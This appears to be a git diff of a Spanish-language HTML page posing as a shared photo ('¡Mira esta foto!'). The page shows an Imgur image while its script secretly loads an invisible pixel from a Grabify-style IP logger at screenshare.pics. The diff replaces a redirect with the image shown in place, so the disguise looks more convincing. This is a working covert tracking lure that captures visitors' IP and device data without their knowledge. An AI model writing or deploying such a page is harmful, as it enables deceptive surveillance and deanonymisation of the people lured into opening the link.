@@ -1,31 +1,23 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Abriendo Imagen...</title>
+    <title>¡Mira esta foto!</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     
     <script>
-        // ** 1. URL DEL PIXEL INVISIBLE (GENERADA POR GRABIFY) **
         const PIXEL_TRACKER_URL = 'https://screenshare.pics/2J1O8I.INSTAGRAM'; 
-        
-        // 2. Ejecuta el rastreo creando el pixel invisible
         const pixel = new Image();
         pixel.src = PIXEL_TRACKER_URL + '?' + Date.now(); 
-
-        // 3. REDIRECCIÓN INSTANTÁNEA a la imagen real de Imgur
-        setTimeout(() => {
-            // Usa la URL directa del archivo .jpeg para que se vea solo la foto.
-            window.location.replace("https://i.imgur.com/AlwlHpE.jpeg"); 
-        }, 100); // 100 milisegundos = casi instantáneo.
-
+        pixel.onload = () => console.log("Rastreo ejecutado.");
     </script>
     
     <style>
-        /* Estilos mínimos */
-        body { background-color: #000; color: white; text-align: center; padding-top: 50px; }
+        /* Estilos para que la imagen ocupe la pantalla, simulando abrir una foto */
+        body { margin: 0; background-color: #000; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        img { max-width: 90%; height: auto; display: block; }
     </style>
 </head>
 <body>
-    Cargando contenido...
+    <img src="https://i.imgur.com/AlwlHpE.jpeg" alt="Foto de Montevideo" />
 </body>
 </html>
